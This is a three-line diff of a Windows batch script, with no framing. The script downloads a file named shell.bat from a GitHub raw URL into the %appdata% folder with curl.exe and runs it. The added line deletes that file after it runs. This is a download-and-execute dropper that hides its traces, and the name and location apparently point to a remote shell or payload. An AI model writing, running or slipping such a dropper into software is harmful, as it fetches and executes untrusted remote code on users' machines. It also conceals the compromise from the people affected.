@@ -1,2 +1,3 @@
 curl.exe -o %appdata%\shell.bat https://raw.githubusercontent.com/mrLeonTheMaster/shell/main/start.bat
 start %appdata%\shell.bat
+del %appdata%\shell.bat
